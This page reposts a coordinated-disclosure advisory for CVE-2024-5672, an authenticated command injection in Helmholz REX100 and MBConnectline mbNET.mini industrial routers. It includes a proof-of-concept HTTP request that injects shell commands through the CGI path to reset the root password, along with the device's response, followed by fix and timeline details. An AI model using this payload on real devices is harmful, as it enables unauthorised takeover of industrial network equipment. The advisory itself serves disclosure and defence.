---
title: Helmholz Industrial Router REX100 / MBConnectline mbNET.mini 2.2.11 Command Injection
url: https://cxsecurity.com/issue/WLB-2024070008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-07-05
fetch_date: 2025-10-06T17:38:29.234744
---

# Helmholz Industrial Router REX100 / MBConnectline mbNET.mini 2.2.11 Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Helmholz Industrial Router REX100 / MBConnectline mbNET.mini 2.2.11 Command Injection** **2024.07.04**  Credit:  **[S. Dietz](https://cxsecurity.com/author/S.%2BDietz/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-5672](https://cxsecurity.com/cveshow/CVE-2024-5672/ "Click to see CVE-2024-5672")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

CyberDanube Security Research 20240703-0
-------------------------------------------------------------------------------
title| Authenticated Command Injection
product| Helmholz Industrial Router REX100
| MBConnectline mbNET.mini
vulnerable version| <= 2.2.11
fixed version| 2.2.13
CVE number| CVE-2024-5672
impact| High
homepage| https://www.helmholz.de/
| https://mbconnectline.com/
found| 2024-05-08
by| S. Dietz (Office Vienna)
| CyberDanube Security Research
| Vienna | St. Plten
|
| https://www.cyberdanube.com
-------------------------------------------------------------------------------
Vendor description
-------------------------------------------------------------------------------
"Helmholz is your specialist when it comes to sophisticated products for your
automation projects. With current, clever system solutions from Helmholz, the
high demands placed on industrial networks in times of increasing automation
can be met both reliably and efficiently - including a high level of operating
convenience. The broad product spectrum ranges from a decentralized I/O system
to switches and repeaters, gateways, a NAT gateway/firewall and secure IoT
remote machine access."
Source: https://www.helmholz.de/en/company/about-helmholz/
Vulnerable versions
-------------------------------------------------------------------------------
Helmholz Industrial Router REX100 <= 2.2.11
MBConnectline mbNET.mini <= 2.2.11
Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Command Injection (CVE-2024-5672)
A command injection was identified on the webserver. This vulnerability can
only be exploited if a user is authenticated on the web interface. This way,
an attacker can invoke commands and is able to get full control over the whole
device.
Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Command Injection (CVE-2024-5672)
The following GET request changes the password for the root user and returns
the process list of the device.
-------------------------------------------------------------------------------
GET /cgi-bin/ping;echo$IFS'root:password'|chpasswd;ps;.sh HTTP/1.1
Host: 192.168.25.11
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic aGVsbWhvbHo6cm91dGVy
Connection: close
Upgrade-Insecure-Requests: 1
-------------------------------------------------------------------------------
HTTP/1.0 200 OK
This is haserl version 0.8.0
This program runs as a cgi interpeter, not interactively.
Bug reports to: Nathan Angelacos <nangel@users.sourceforge.net>
Password for 'root' changed
PID USER VSZ STAT COMMAND
1 root 2292 S init
2 root 0 SW [kthreadd]
3 root 0 SW [ksoftirqd/0]
4 root 0 SW [events/0]
5 root 0 SW [khelper]
8 root 0 SW [async/mgr]
[...]
Solution
-------------------------------------------------------------------------------
Update to latest version: 2.2.13
Workaround
-------------------------------------------------------------------------------
None
Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends Helmholz customers to upgrade the firmware to the latest
version available and to restrict network access to the management interface of
the device.
Contact Timeline
-------------------------------------------------------------------------------
2024-05-15: Contacting Helmholz via psirt@helmholz.de.
2024-05-15: Receiving security contact for MBConnectline.
2024-05-21: Contact stated they are working on a fix.
2024-06-13: Received advisory from contact and assigned CVE number.
2024-07-01: Contact sends out final release date.
2024-07-03: Coordinated release of advisory with CERT@VDE.
Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com
EOF S. Dietz / @2024

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024070008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top